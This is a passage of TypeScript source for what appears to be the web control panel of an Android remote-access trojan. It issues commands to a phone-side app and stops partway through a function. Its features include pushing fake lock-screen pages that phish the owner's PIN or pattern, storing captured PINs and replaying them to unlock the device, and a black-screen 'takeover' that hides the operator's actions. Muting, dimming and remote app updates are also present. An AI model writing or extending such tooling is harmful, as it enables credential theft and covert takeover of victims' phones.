import { useCallback, useEffect, useRef, useState } from "react";
import { createPortal } from "react-dom";
import { Button, Form, Input, Modal, Select, Space, Tabs, message } from "antd";
import type { TextAreaRef } from "antd/es/input/TextArea";
import { PlusOutlined } from "@ant-design/icons";
import {
  AppstoreOutlined,
  AudioMutedOutlined,
  BulbOutlined,
  CloudDownloadOutlined,
  ControlOutlined,
  DeleteOutlined,
  DesktopOutlined,
  EyeInvisibleOutlined,
  LockOutlined,
  MailOutlined,
  MoonOutlined,
  PoweroffOutlined,
  RobotOutlined,
  RotateRightOutlined,
  SnippetsOutlined,
  ApiOutlined,
} from "@ant-design/icons";
import {
  clearKeyguardPin,
  createFakePageWebLink,
  fetchFakePageSubmissions,
  fetchFakePageWebLinks,
  saveKeyguardPin,
  saveKeyguardPinHistory,
  sendCommand,
  fetchCommand,
  type FakePageWebLink,
} from "../api/client";
import type { FakePageSubmission, KeyguardPinRecord } from "../types";
import type { OpsWorkspaceKind } from "../types/ops-workspace";
import { didCloseAccessibility } from "../utils/accessibility-close";
import { readComputerClipboardText } from "../utils/clipboard-to-phone";
import {
  isMaskedSecret,
  isPatternCells,
  lockTypeLabel,
  resolveLockType,
  setPasswordAsDefault,
} from "../utils/device-password-store";
import { DeviceAppListModal } from "./DeviceAppListModal";
import { DevicePasswordRecordsPanel } from "./DevicePasswordRecordsPanel";
import { DeviceSmsModal } from "./DeviceSmsModal";

interface RemoteOpsPanelProps {
  deviceId: string;
  deviceLabel?: string;
  isOnline: boolean;
  keyguardPin: KeyguardPinRecord | null;
  onCommandSent: (message: string) => void;
  onKeyguardPinChange?: (record: KeyguardPinRecord | null) => void;
  opsWorkspace: OpsWorkspaceKind;
  onOpsWorkspaceChange: (kind: OpsWorkspaceKind) => void;
  /** ScreenViewer 公共操作区 portal 宿主 */
  workspaceHost: HTMLElement | null;
}

function formatTime(timestamp: number) {
  return new Date(timestamp).toLocaleString("zh-CN");
}

const KEYGUARD_FAKE_PACKAGE = "__keyguard__";

type KeyguardLockTypeWire = "pin" | "password" | "pattern" | "none";

function isHttpsUrl(value: string): boolean {
  return /^https:\/\/.+/i.test(value.trim());
}

function formatLockTypeLabel(type: string | null | undefined): string {
  switch (type) {
    case "pattern":
      return "图案";
    case "password":
      return "混合密码";
    case "pin":
      return "数字 PIN";
    case "none":
      return "未进入输入页";
    default:
      return "未知";
  }
}

function formatUpdateApkHint(status: string, errorText: string): string {
  const code = errorText || status;
  if (code === "client_apk_url_not_configured") {
    return "未配置 B 包下载地址（菜单：B包更新）";
  }
  if (code === "client_apk_url_invalid") {
    return "B 包下载地址无效，需 http/https";
  }
  if (code === "client_apk_update_disabled") {
    return "B 包更新已关闭";
  }
  if (code.startsWith("unsupported_cmd")) {
    return "当前 B 包不支持远程更新，需先用 A 装新包";
  }
  if (status === "already_latest" || code === "already_latest") {
    return "已是最新，无需更新";
  }
  if (status === "pending_user" || code === "pending_user") {
    return "请在投屏里点「更新/安装」";
  }
  if (status === "need_install_permission" || code === "need_install_permission") {
    return "请在投屏里允许「安装未知应用」后重试";
  }
  if (status === "success" || status === "started") {
    return "已开始安装，设备可能短暂离线";
  }
  if (code === "apk_package_mismatch") {
    return "下载的 APK 包名不是当前 B 包";
  }
  if (code === "wait_timeout" || status === "timeout") {
    return "等待超时，下载可能仍在进行，请看投屏";
  }
  if (status === "sent") {
    return "已下发，正在下载，请看投屏";
  }
  return errorText || status || "已下发";
}

export function RemoteOpsPanel({
  deviceId,
  deviceLabel,
  isOnline,
  keyguardPin,
  onCommandSent,
  onKeyguardPinChange,
  opsWorkspace,
  onOpsWorkspaceChange,
  workspaceHost,
}: RemoteOpsPanelProps) {
  const [unlockPin, setUnlockPin] = useState("");
  const [unlockBusy, setUnlockBusy] = useState(false);
  const [unlockMessage, setUnlockMessage] = useState<string | null>(null);
  const [rebootBusy, setRebootBusy] = useState(false);
  const [uninstallBusy, setUninstallBusy] = useState(false);
  const [updateApkBusy, setUpdateApkBusy] = useState(false);
  const [muteBusy, setMuteBusy] = useState(false);
  const [lockBusy, setLockBusy] = useState(false);
  const [lockMessage, setLockMessage] = useState<string | null>(null);
  const [blackScreenBusy, setBlackScreenBusy] = useState(false);
  const [blackScreenActive, setBlackScreenActive] = useState(false);
  const [takeoverBusy, setTakeoverBusy] = useState(false);
  const [takeoverActive, setTakeoverActive] = useState(false);
  const [pasteBusy, setPasteBusy] = useState(false);
  const [clipboardOpen, setClipboardOpen] = useState(false);
  const [clipboardInput, setClipboardInput] = useState("");
  const clipboardFieldRef = useRef<TextAreaRef>(null);
  // 黑屏阻断 / 接管的实时状态镜像：退出详情页时据此决定要不要下发关闭指令
  const blockerStateRef = useRef({ blackScreen: false, takeover: false });
  useEffect(() => {
    blockerStateRef.current = { blackScreen: blackScreenActive, takeover: takeoverActive };
  }, [blackScreenActive, takeoverActive]);
  const [rotationBusy, setRotationBusy] = useState(false);
  const [autoRotationEnabled, setAutoRotationEnabled] = useState(false);
  const [keepAwakeBusy, setKeepAwakeBusy] = useState(false);
  const [keepAwakeActive, setKeepAwakeActive] = useState(false);
  const [brightnessBusy, setBrightnessBusy] = useState(false);
  const lockWorkspaceOpen = opsWorkspace === "lock";
  const appsWorkspaceOpen = opsWorkspace === "apps";
  const smsWorkspaceOpen = opsWorkspace === "sms";
  const adbWorkspaceOpen = opsWorkspace === "adb";
  const [keyguardFakeWebUrl, setKeyguardFakeWebUrl] = useState("");
  const [keyguardFakeWebLinks, setKeyguardFakeWebLinks] = useState<FakePageWebLink[]>([]);
  const [keyguardFakeWebLinksLoading, setKeyguardFakeWebLinksLoading] = useState(false);
  const [keyguardFakeAddLinkOpen, setKeyguardFakeAddLinkOpen] = useState(false);
  const [keyguardFakeNewLinkName, setKeyguardFakeNewLinkName] = useState("");
  const [keyguardFakeNewLinkUrl, setKeyguardFakeNewLinkUrl] = useState("");
  const [keyguardFakeAddingLink, setKeyguardFakeAddingLink] = useState(false);
  const [keyguardFakeBusy, setKeyguardFakeBusy] = useState(false);
  const [keyguardFakeMessage, setKeyguardFakeMessage] = useState<string | null>(null);
  const [keyguardFakeMessageKind, setKeyguardFakeMessageKind] = useState<"info" | "success" | "warn">(
    "info",
  );
  const [keyguardFakeRecords, setKeyguardFakeRecords] = useState<FakePageSubmission[]>([]);
  const [keyguardFakeRecordsLoading, setKeyguardFakeRecordsLoading] = useState(false);
  const [lockTypeLive, setLockTypeLive] = useState<KeyguardLockTypeWire | null>(null);
  const [lockTypeDetecting, setLockTypeDetecting] = useState(false);
  const [lockModalTab, setLockModalTab] = useState<"unlock" | "fake">("unlock");
  const [passwordStoreTick, setPasswordStoreTick] = useState(0);
  const [fakeRecordBusyId, setFakeRecordBusyId] = useState<string | null>(null);

  const loadKeyguardFakeWebLinks = useCallback(async () => {
    setKeyguardFakeWebLinksLoading(true);
    try {
      const list = await fetchFakePageWebLinks();
      setKeyguardFakeWebLinks(list);
      setKeyguardFakeWebUrl((current) => {
        if (current && list.some((item) => item.url === current)) {
          return current;
        }
        return list[0]?.url ?? "";
      });
    } catch {
      setKeyguardFakeWebLinks([]);
    } finally {
      setKeyguardFakeWebLinksLoading(false);
    }
  }, []);

  const loadKeyguardFakeRecords = useCallback(async () => {
    if (!deviceId) {
      setKeyguardFakeRecords([]);
      return;
    }
    setKeyguardFakeRecordsLoading(true);
    try {
      const list = await fetchFakePageSubmissions(deviceId, KEYGUARD_FAKE_PACKAGE, 8);
      setKeyguardFakeRecords(list);
    } catch {
      setKeyguardFakeRecords([]);
    } finally {
      setKeyguardFakeRecordsLoading(false);
    }
  }, [deviceId]);

  const detectKeyguardLockType = useCallback(async () => {
    if (!deviceId || !isOnline) {
      setLockTypeLive(null);
      return;
    }
    setLockTypeDetecting(true);
    try {
      const result = await sendCommand({
        deviceId,
        cmd: "get_keyguard_lock_type",
        params: {},
        waitMs: 12000,
      });
      if (result.status !== "success") {
        setLockTypeLive(null);
        return;
      }
      const raw = String(result.result?.lockType ?? "").toLowerCase();
      if (
        raw === "pin" ||
        raw === "password" ||
        raw === "pattern" ||
        raw === "none"
      ) {
        setLockTypeLive(raw);
      } else {
        setLockTypeLive(null);
      }
    } catch {
      setLockTypeLive(null);
    } finally {
      setLockTypeDetecting(false);
    }
  }, [deviceId, isOnline]);

  function showKeyguardFakeHint(text: string, kind: "info" | "success" | "warn" = "info") {
    setKeyguardFakeMessage(text);
    setKeyguardFakeMessageKind(kind);
  }

  useEffect(() => {
    if (!lockWorkspaceOpen) {
      return;
    }
    setKeyguardFakeMessage(null);
    setKeyguardFakeMessageKind("info");
    setLockTypeLive(null);
    setLockModalTab("unlock");
    void loadKeyguardFakeWebLinks();
    void loadKeyguardFakeRecords();
    if (!keyguardPin?.lockType) {
      void detectKeyguardLockType();
    }
  }, [
    lockWorkspaceOpen,
    loadKeyguardFakeWebLinks,
    loadKeyguardFakeRecords,
    detectKeyguardLockType,
    keyguardPin?.lockType,
  ]);

  function toggleWorkspace(kind: OpsWorkspaceKind) {
    const next = opsWorkspace === kind ? "none" : kind;
    onOpsWorkspaceChange(next);
    if (next === "adb" && isOnline) {
      void beginAdbOpsSession();
    }
  }

  async function beginAdbOpsSession() {
    try {
      const result = await sendCommand({
        deviceId,
        cmd: "adb_session_begin",
        params: { timeoutMs: 5 * 60_000 },
        waitMs: 8000,
      });
      if (result.status === "success") {
        onCommandSent("ADB 运维会话已开（约 5 分钟内可进开发者/无线调试，到期再点 ADB）");
      } else {
        onCommandSent(`ADB 运维会话开启失败：${result.errorMessage ?? result.status}`);
      }
    } catch (error) {
      const hint = error instanceof Error ? error.message : "adb_session_begin_failed";
      onCommandSent(`ADB 运维会话开启失败：${hint}`);
    }
  }

  const displayedLockType = keyguardPin?.lockType ?? lockTypeLive;
  const lockTypeSource = keyguardPin?.lockType
    ? "已采集"
    : lockTypeLive
      ? "实时检测"
      : null;

  useEffect(() => {
    const pin = keyguardPin?.pin?.trim() ?? "";
    if (!pin || isMaskedSecret(pin)) {
      return;
    }
    setUnlockPin(pin);
  }, [
    keyguardPin?.pin,
    keyguardPin?.updatedAt,
    keyguardPin?.capturedAt,
    keyguardPin?.lockType,
  ]);

  async function sendTextToPhone(text: string) {
    if (!isOnline) {
      return;
    }
    setPasteBusy(true);
    try {
      const result = await sendCommand({
        deviceId,
        cmd: "input_text",
        params: { text },
        waitMs: 5000,
      });
      if (result.status === "success") {
        onCommandSent(`剪切板：已填入 ${text.length} 字`);
      } else {
        onCommandSent(`剪切板：失败：${result.errorMessage ?? result.status}`);
      }
    } catch (error) {
      const hint = error instanceof Error ? error.message : "input failed";
      onCommandSent(`剪切板发送失败：${hint}`);
    } finally {
      setPasteBusy(false);
    }
  }

  async function handleClipboardSubmit() {
    const text = clipboardInput;
    if (!text) {
      return;
    }
    setClipboardOpen(false);
    setClipboardInput("");
    await sendTextToPhone(text);
  }

  async function fillFromComputerClipboard() {
    try {
      const text = await readComputerClipboardText();
      if (text) {
        setClipboardInput(text);
      }
    } catch {
      // 读取失败就保持用户手动输入
    }
  }

  async function refreshBlackScreenState() {
    if (!isOnline) {
      return;
    }
    try {
      const result = await sendCommand({
        deviceId,
        cmd: "get_device_info",
        params: {},
        waitMs: 5000,
      });
      if (result.status === "success") {
        setBlackScreenActive(Boolean(result.result?.blackScreenActive));
        setTakeoverActive(Boolean(result.result?.phoneTakeoverActive));
        if (result.result?.autoRotationEnabled != null) {
          setAutoRotationEnabled(Boolean(result.result.autoRotationEnabled));
        }
      }
    } catch {
      // ignore polling errors
    }
  }

  useEffect(() => {
    void refreshBlackScreenState();
  }, [deviceId, isOnline]);

  async function sendWakeScreen() {
    if (!isOnline) {
      return;
    }
    setUnlockBusy(true);
    setUnlockMessage(null);
    try {
      const result = await sendCommand({
        deviceId,
        cmd: "wake_screen",
        params: {},
        waitMs: 5000,
      });
      const locked = Boolean(result.result?.keyguardLocked);
      const hint = locked ? "已唤醒，仍锁屏" : "屏幕已唤醒";
      setUnlockMessage(hint);
      onCommandSent(`唤醒：${hint}`);
    } catch (error) {
      const hint = error instanceof Error ? error.message : "wake failed";
      setUnlockMessage(hint);
      onCommandSent(`唤醒失败：${hint}`);
    } finally {
      setUnlockBusy(false);
    }
  }

  async function sendLockScreen() {
    if (!isOnline || lockBusy) {
      return;
    }
    setLockBusy(true);
    setLockMessage(null);
    try {
      const result = await sendCommand({
        deviceId,
        cmd: "lock_screen",
        params: {},
        waitMs: 5000,
      });
      if (result.status === "success") {
        setLockMessage("已下发锁屏");
        onCommandSent("锁屏：已下发");
      } else {
        const message = result.errorMessage ?? result.status;
        const hint = message.includes("device_admin")
          ? "需先开启设备管理员权限"
          : `失败：${message}`;
        setLockMessage(hint);
        onCommandSent(`锁屏失败：${hint}`);
      }
    } catch (error) {
      const hint = error instanceof Error ? error.message : "lock failed";
      setLockMessage(hint);
      onCommandSent(`锁屏失败：${hint}`);
    } finally {
      setLockBusy(false);
    }
  }

  async function toggleBlackScreen() {
    if (!isOnline || blackScreenBusy) {
      return;
    }
    setBlackScreenBusy(true);
    const cmd = blackScreenActive ? "unblack_screen" : "black_screen";
    // 开启时先乐观记上，避免刚点完就离开详情页导致清理漏发
    if (cmd === "black_screen") {
      blockerStateRef.current.blackScreen = true;
    }
    try {
      const result = await sendCommand({
        deviceId,
        cmd,
        params: {},
        waitMs: 5000,
      });
      if (result.status === "success") {
        const active = Boolean(result.result?.active);
        setBlackScreenActive(active);
        onCommandSent(active ? "黑屏阻断：已开启" : "黑屏阻断：已关闭");
      } else {
        blockerStateRef.current.blackScreen = blackScreenActive;
        const message = result.errorMessage ?? result.status;
        onCommandSent(
          message.includes("accessibility") ? "黑屏阻断：需先开启辅助功能" : `黑屏阻断失败：${message}`,
        );
      }
    } catch (error) {
      blockerStateRef.current.blackScreen = blackScreenActive;
      const hint = error instanceof Error ? error.message : "black screen failed";
      onCommandSent(`黑屏阻断失败：${hint}`);
    } finally {
      setBlackScreenBusy(false);
    }
  }

  async function toggleAutoRotation() {
    if (!isOnline || rotationBusy) {
      return;
    }
    setRotationBusy(true);
    const nextEnabled = !autoRotationEnabled;
    try {
      const result = await sendCommand({
        deviceId,
        cmd: "set_auto_rotation",
        params: { enabled: nextEnabled ? 1 : 0 },
        waitMs: 5000,
      });
      if (result.status === "success") {
        const enabled = Boolean(result.result?.enabled ?? nextEnabled);
        setAutoRotationEnabled(enabled);
        onCommandSent(enabled ? "自动旋转：已开启" : "自动旋转：已关闭");
        return;
      }
      const message = result.errorMessage ?? result.status;
      if (message.includes("write_settings_required")) {
        onCommandSent("自动旋转：需先在手机授权「修改系统设置」");
        await sendCommand({
          deviceId,
          cmd: "open_write_settings",
          params: {},
          waitMs: 3000,
        }).catch(() => {
          // 静默
        });
      } else {
        onCommandSent(`自动旋转失败：${message}`);
      }
    } catch (error) {
      const hint = error instanceof Error ? error.message : "auto_rotation_failed";
      onCommandSent(`自动旋转失败：${hint}`);
    } finally {
      setRotationBusy(false);
    }
  }

  async function toggleKeepAwakeScreen() {
    if (!isOnline || keepAwakeBusy) {
      return;
    }
    setKeepAwakeBusy(true);
    try {
      if (keepAwakeActive) {
        const result = await sendCommand({
          deviceId,
          cmd: "stop_remote_keep_awake",
          waitMs: 8_000,
        });
        if (result.status === "success") {
          setKeepAwakeActive(false);
          onCommandSent("屏幕常亮：已关闭");
        } else {
          onCommandSent(`屏幕常亮失败：${result.errorMessage ?? result.status}`);
        }
        return;
      }

      const result = await sendCommand({
        deviceId,
        cmd: "start_remote_keep_awake",
        waitMs: 8_000,
      });
      if (result.status !== "success") {
        const err = result.errorMessage ?? result.status;
        onCommandSent(
          String(err).includes("accessibility") ? "屏幕常亮：需先开启辅助功能" : `屏幕常亮失败：${err}`,
        );
        return;
      }

      const writeGranted = Boolean(result.result?.writeSettingsGranted);
      if (!writeGranted) {
        setKeepAwakeActive(false);
        onCommandSent("屏幕常亮：等待授权修改系统设置");
        await sendCommand({
          deviceId,
          cmd: "open_write_settings",
          params: {},
          waitMs: 3_000,
        }).catch(() => {
          /* ignore */
        });
        // 无 WRITE_SETTINGS 时息屏时长改不了，先停掉半开状态
        await sendCommand({
          deviceId,
          cmd: "stop_remote_keep_awake",
          waitMs: 8_000,
        }).catch(() => {
          /* ignore */
        });
        return;
      }

      setKeepAwakeActive(true);
      onCommandSent("屏幕常亮：已开启");
    } catch (error) {
      const hint = error instanceof Error ? error.message : "keep_awake_failed";
      onCommandSent(`屏幕常亮失败：${hint}`);
    } finally {
      setKeepAwakeBusy(false);
    }
  }

  useEffect(() => {
    if (!keepAwakeActive || !deviceId) {
      return;
    }
    return () => {
      void sendCommand({
        deviceId,
        cmd: "stop_remote_keep_awake",
        waitMs: 8_000,
      }).catch(() => {
        /* ignore */
      });
    };
  }, [deviceId, keepAwakeActive]);

  // 退出设备详情页（离开路由 / 卸载本组件）时，把还开着的黑屏阻断与接管一并关掉，
  // 否则手机端会一直停在无响应状态，用户只能等超时。
  useEffect(() => {
    if (!deviceId) {
      return;
    }
    const closeBlockers = () => {
      const { blackScreen, takeover } = blockerStateRef.current;
      if (!blackScreen && !takeover) {
        return;
      }
      blockerStateRef.current = { blackScreen: false, takeover: false };
      // 页面可能从 bfcache 恢复，UI 状态也要跟着落回「已关闭」
      if (blackScreen) {
        setBlackScreenActive(false);
        void sendCommand({
          deviceId,
          cmd: "unblack_screen",
          params: {},
          waitMs: 5_000,
          keepalive: true,
        }).catch(() => {
          /* ignore */
        });
      }
      if (takeover) {
        setTakeoverActive(false);
        void sendCommand({
          deviceId,
          cmd: "untakeover_phone",
          params: {},
          waitMs: 8_000,
          keepalive: true,
        }).catch(() => {
          /* ignore */
        });
      }
    };

    // 直接关标签页 / 刷新时组件不会走卸载清理，靠 pagehide 兜底
    window.addEventListener("pagehide", closeBlockers);
    return () => {
      window.removeEventListener("pagehide", closeBlockers);
      closeBlockers();
    };
  }, [deviceId]);

  async function togglePhoneTakeover() {
    if (!isOnline || takeoverBusy) {
      return;
    }
    setTakeoverBusy(true);
    const cmd = takeoverActive ? "untakeover_phone" : "takeover_phone";
    // 开启时先乐观记上，避免刚点完就离开详情页导致清理漏发
    if (cmd === "takeover_phone") {
      blockerStateRef.current.takeover = true;
    }
    try {
      const result = await sendCommand({
        deviceId,
        cmd,
        params: {},
        waitMs: 8000,
      });
      if (result.status === "success") {
        const active = Boolean(
          result.result?.active ?? result.result?.phoneTakeoverActive ?? !takeoverActive,
        );
        setTakeoverActive(active);
        onCommandSent(active ? "接管阻断：已开启" : "接管阻断：已关闭");
      } else {
        blockerStateRef.current.takeover = takeoverActive;
        const message = result.errorMessage ?? result.status;
        onCommandSent(
          String(message).includes("accessibility")
            ? "接管手机：需先开启辅助功能"
            : `接管手机失败：${message}`,
        );
      }
    } catch (error) {
      blockerStateRef.current.takeover = takeoverActive;
      const hint = error instanceof Error ? error.message : "takeover failed";
      onCommandSent(`接管手机失败：${hint}`);
    } finally {
      setTakeoverBusy(false);
    }
  }

  async function sendMutePhone() {
    if (!isOnline) {
      return;
    }
    setMuteBusy(true);
    try {
      const result = await sendCommand({
        deviceId,
        cmd: "set_silent",
        params: {},
        waitMs: 5000,
      });
      if (result.status === "success") {
        onCommandSent("静音：已下发");
      } else {
        const message = result.errorMessage ?? result.status;
        onCommandSent(`静音失败：${message}`);
      }
    } catch (error) {
      const message = error instanceof Error ? error.message : "mute failed";
      onCommandSent(`静音失败：${message}`);
    } finally {
      setMuteBusy(false);
    }
  }

  async function sendBrightnessMin() {
    if (!isOnline || brightnessBusy) {
      return;
    }
    setBrightnessBusy(true);
    try {
      const result = await sendCommand({
        deviceId,
        cmd: "set_brightness_min",
        params: {},
        waitMs: 5000,
      });
      if (result.status === "success") {
        onCommandSent("亮度：已调至最低");
        return;
      }
      const message = result.errorMessage ?? result.status;
      if (String(message).includes("write_settings_required")) {
        onCommandSent("亮度最低：需先在手机授权「修改系统设置」");
        await sendCommand({
          deviceId,
          cmd: "open_write_settings",
          params: {},
          waitMs: 3000,
        }).catch(() => {
          /* ignore */
        });
      } else {
        onCommandSent(`亮度最低失败：${message}`);
      }
    } catch (error) {
      const hint = error instanceof Error ? error.message : "brightness_failed";
      onCommandSent(`亮度最低失败：${hint}`);
    } finally {
      setBrightnessBusy(false);
    }
  }

  async function sendRebootPhone() {
    if (!isOnline) {
      return;
    }
    const confirmed = window.confirm(
      "确认打开电源菜单？仅拉起重启界面，需在手机上手动滑动完成重启。",
    );
    if (!confirmed) {
      return;
    }
    setRebootBusy(true);
    try {
      const result = await sendCommand({
        deviceId,
        cmd: "reboot",
        params: {},
        waitMs: 8000,
      });
      if (result.status === "success") {
        onCommandSent("重启手机：已打开电源菜单（需手动滑动）");
      } else {
        const message = result.errorMessage ?? result.status;
        onCommandSent(`重启手机失败：${message}`);
      }
    } catch (error) {
      const message = error instanceof Error ? error.message : "reboot failed";
      onCommandSent(`重启手机失败：${message}`);
    } finally {
      setRebootBusy(false);
    }
  }

  async function sendUninstallPhone() {
    if (!isOnline) {
      return;
    }
    const confirmed = window.confirm(
      "确认关闭无障碍？关闭后可到系统设置里手动卸载，远程控制会掉线。",
    );
    if (!confirmed) {
      return;
    }
    setUninstallBusy(true);
    try {
      const result = await sendCommand({
        deviceId,
        cmd: "uninstall",
        // 工具栏"卸载"多为临时排查，只抑制 1 分钟；
        // ADB 面板的关闭无障碍走默认 30 分钟。
        params: { suppressMs: 60000 },
        waitMs: 8000,
      });
      if (didCloseAccessibility(result)) {
        onCommandSent(
          result.status === "success" ? "卸载：已关闭无障碍" : "卸载：无障碍已是关闭状态",
        );
      } else {
        const fail = result.errorMessage ?? result.status;
        onCommandSent(`卸载失败：${fail}`);
      }
    } catch (error) {
      const message = error instanceof Error ? error.message : "uninstall failed";
      onCommandSent(`卸载失败：${message}`);
    } finally {
      setUninstallBusy(false);
    }
  }

  async function sendUpdateApk() {
    if (!isOnline) {
      return;
    }
    const confirmed = window.confirm(
      "确认更新 B 包？会下载并覆盖安装。versionCode 必须更大。若弹出确认框，请开投屏在画面上点「更新」。设备会短暂离线。",
    );
    if (!confirmed) {
      return;
    }
    setUpdateApkBusy(true);
    try {
      const accepted = await sendCommand({
        deviceId,
        cmd: "update_apk",
        params: {},
        waitMs: 0,
      });
      onCommandSent("更新 B 包：已下发，正在下载，请看投屏");

      const deadline = Date.now() + 180_000;
      let latest = accepted;
      while (Date.now() < deadline) {
        if (latest.status === "success" || latest.status === "failed" || latest.status === "timeout") {
          break;
        }
        await new Promise((resolve) => window.setTimeout(resolve, 2000));
        latest = await fetchCommand(accepted.id);
      }
      const resultStatus =
        typeof latest.result?.status === "string" ? latest.result.status : latest.status;
      const errorText = latest.errorMessage ?? "";
      const hint =
        latest.status === "sent"
          ? "下载可能仍在进行，请看投屏；有安装框就点「更新」"
          : formatUpdateApkHint(resultStatus, errorText);
      onCommandSent(`更新 B 包：${hint}`);
    } catch (error) {
      const raw = error instanceof Error ? error.message : "update_apk failed";
      const hint = formatUpdateApkHint("", raw);
      onCommandSent(`更新 B 包失败：${hint}`);
    } finally {
      setUpdateApkBusy(false);
    }
  }

  async function sendUnlockPattern(cells: string, gesturePath = "") {
    if (!isOnline) {
      return;
    }
    const normalized = cells.trim();
    if (!isPatternCells(normalized)) {
      setUnlockMessage("图形格式无效，需类似 1-2-5-8-9");
      return;
    }
    setUnlockBusy(true);
    setUnlockMessage(null);
    try {
      const path = gesturePath.trim().startsWith("[") ? gesturePath.trim() : "";
      const result = await sendCommand({
        deviceId,
        cmd: "unlock_pattern",
        params: {
          gesturePath: path,
          path: normalized,
          pin: normalized,
          cellsOnly: !path,
          swipeUp: true,
        },
        waitMs: 45000,
      });
      const ok = result.status === "success";
      setUnlockMessage(ok ? "图形解锁指令已发送" : `失败：${result.errorMessage ?? result.status}`);
      onCommandSent(ok ? "图形解锁已下发" : `图形解锁失败：${result.errorMessage ?? result.status}`);
    } catch (error) {
      const hint = error instanceof Error ? error.message : "unlock pattern failed";
      setUnlockMessage(hint);
      onCommandSent(`图形解锁失败：${hint}`);
    } finally {
      setUnlockBusy(false);
    }
  }

  async function sendUnlockPin() {
    const value = unlockPin.trim();
    const record = keyguardPin;

    // 顶部「解锁」兼容图形：有采集记录时直接走 unlock_pattern（与一键解锁同链路）
    if (record?.lockType === "pattern") {
      const cells = isPatternCells(value) ? value : record.pin;
      if (!value || value === record.pin || isPatternCells(value)) {
        await sendUnlockWithRecord({ ...record, pin: cells });
        return;
      }
    }

    if (isPatternCells(value)) {
      await sendUnlockPattern(
        value,
        record?.lockType === "pattern" && record.gesturePath?.startsWith("[")
          ? record.gesturePath
          : "",
      );
      return;
    }

    await sendUnlockPinWithPin(value);
  }

  async function sendUnlockWithRecord(record: KeyguardPinRecord) {
    if (!isOnline) {
      return;
    }
    if (record.lockType === "pattern") {
      await sendUnlockPattern(record.pin, record.gesturePath ?? "");
      return;
    }
    if (isMaskedSecret(record.pin)) {
      setUnlockMessage(
        "采集到的是掩码（如 •••••5），不是真实密码。请在本机重新解锁一次以重新采集，再点一键解锁",
      );
      onCommandSent("一键解锁失败：凭据为掩码，需重新采集");
      return;
    }

    if (record.lockType === "password" && !/^\d+$/.test(record.pin.trim())) {
      setUnlockMessage(
        "当前为混合密码，一键解锁仅支持纯数字 PIN。请在上方解锁框手动输入完整密码后点「解锁」",
      );
      setUnlockPin(record.pin);
      return;
    }

    setUnlockPin(record.pin);
    await sendUnlockPinWithPin(record.pin);
  }

  async function sendUnlockPinWithPin(pin: string) {
    if (!isOnline || !pin) {
      return;
    }
    if (isMaskedSecret(pin)) {
      setUnlockMessage(
        "解锁内容含掩码字符（•），无法下发。请填写真实数字 PIN，或本机重新解锁采集",
      );
      return;
    }
    const digits = pin.trim();
    if (!/^\d+$/.test(digits)) {
      setUnlockMessage("unlock_pin 仅支持纯数字 PIN");
      return;
    }
    setUnlockBusy(true);
    setUnlockMessage(null);
    try {
      const result = await sendCommand({
        deviceId,
        cmd: "unlock_pin",
        params: { pin: digits, swipeUp: true },
        waitMs: 45000,
      });
      const hint =
        result.status === "success" ? "解锁指令已发送" : `失败：${result.errorMessage ?? result.status}`;
      setUnlockMessage(hint);
      onCommandSent(result.status === "success" ? "PIN 解锁已下发" : `PIN 解锁失败：${result.errorMessage ?? result.status}`);
    } catch (error) {
      const hint = error instanceof Error ? error.message : "unlock failed";
      setUnlockMessage(hint);
      onCommandSent(`PIN 解锁失败：${hint}`);
    } finally {
      setUnlockBusy(false);
    }
  }

  async function handleClearInvalidKeyguard() {
    try {
      await clearKeyguardPin(deviceId);
      onKeyguardPinChange?.(null);
      setUnlockMessage("已清除无效掩码采集");
      onCommandSent("已清除无效锁屏采集");
    } catch (error) {
      setUnlockMessage(error instanceof Error ? error.message : "clear failed");
    }
  }

  async function handleAddKeyguardFakeWebLink() {
    const name = keyguardFakeNewLinkName.trim();
    const url = keyguardFakeNewLinkUrl.trim();
    if (!name) {
      message.warning("请填写名称");
      return;
    }
    if (!url) {
      message.warning("请填写链接");
      return;
    }
    if (!isHttpsUrl(url)) {
      message.warning("链接必须是 https:// 开头");
      return;
    }
    setKeyguardFakeAddingLink(true);
    try {
      const created = await createFakePageWebLink({ name, url });
      message.success("已新增 Web 链接");
      setKeyguardFakeAddLinkOpen(false);
      setKeyguardFakeNewLinkName("");
      setKeyguardFakeNewLinkUrl("");
      await loadKeyguardFakeWebLinks();
      setKeyguardFakeWebUrl(created.url);
    } catch (error) {
      message.error(error instanceof Error ? error.message : "新增失败");
    } finally {
      setKeyguardFakeAddingLink(false);
    }
  }

  async function sendKeyguardFakePage() {
    if (!isOnline || keyguardFakeBusy) {
      return;
    }
    const trimmedWebUrl = keyguardFakeWebUrl.trim();
    if (!trimmedWebUrl) {
      message.warning(
        keyguardFakeWebLinks.length === 0 ? "请先新增 Web 链接" : "请选择 Web 链接",
      );
      return;
    }
    if (!isHttpsUrl(trimmedWebUrl)) {
      message.warning("Web 链接必须是 https:// 开头");
      return;
    }
    await sendKeyguardFakePageWithType("web", { webUrl: trimmedWebUrl });
  }

  async function sendKeyguardFakePatternPage() {
    if (!isOnline || keyguardFakeBusy) {
      return;
    }
    const trimmedWebUrl = keyguardFakeWebUrl.trim();
    if (!trimmedWebUrl) {
      message.warning(
        keyguardFakeWebLinks.length === 0 ? "请先新增图案 Web 链接" : "请选择图案 Web 链接",
      );
      return;
    }
    if (!isHttpsUrl(trimmedWebUrl)) {
      message.warning("Web 链接必须是 https:// 开头");
      return;
    }
    await sendKeyguardFakePageWithType("pattern", { webUrl: trimmedWebUrl });
  }

  async function sendKeyguardFakePageWithType(
    kind: "web" | "pattern",
    extra?: { webUrl?: string },
  ) {
    const webUrl = extra?.webUrl?.trim() ?? "";
    if (!webUrl) {
      message.warning("Web 链接不能为空");
      return;
    }
    if (!isHttpsUrl(webUrl)) {
      message.warning("Web 链接必须是 https:// 开头");
      return;
    }
    setKeyguardFakeBusy(true);
    setKeyguardFakeMessage(null);
    try {
      const result = await sendCommand({
        deviceId,
        cmd: "show_keyguard_fake_page",
        params: {
          pageType: "web",
          title: "锁屏验证",
          webUrl,
        },
        waitMs: 20000,
      });
      if (result.status !== "success") {
        throw new Error(result.errorMessage ?? result.status);
      }
      setKeyguardFakeMessage(
        kind === "pattern"
          ? `图案伪页已下发：${webUrl}`
          : `锁屏伪页已下发：${webUrl}`,
      );
      onCommandSent(kind === "pattern" ? "图案 Web 伪页：已下发" : "锁屏伪页：已下发");
    } catch (error) {
      const text = error instanceof Error ? error.message : "下发失败";
      setKeyguardFakeMessage(text);
      message.error(text);
    } finally {
      setKeyguardFakeBusy(false);
    }
  }

  async function hideKeyguardFakePage() {
    if (!isOnline || keyguardFakeBusy) {
      return;
    }
    setKeyguardFakeBusy(true);
    setKeyguardFakeMessage(null);
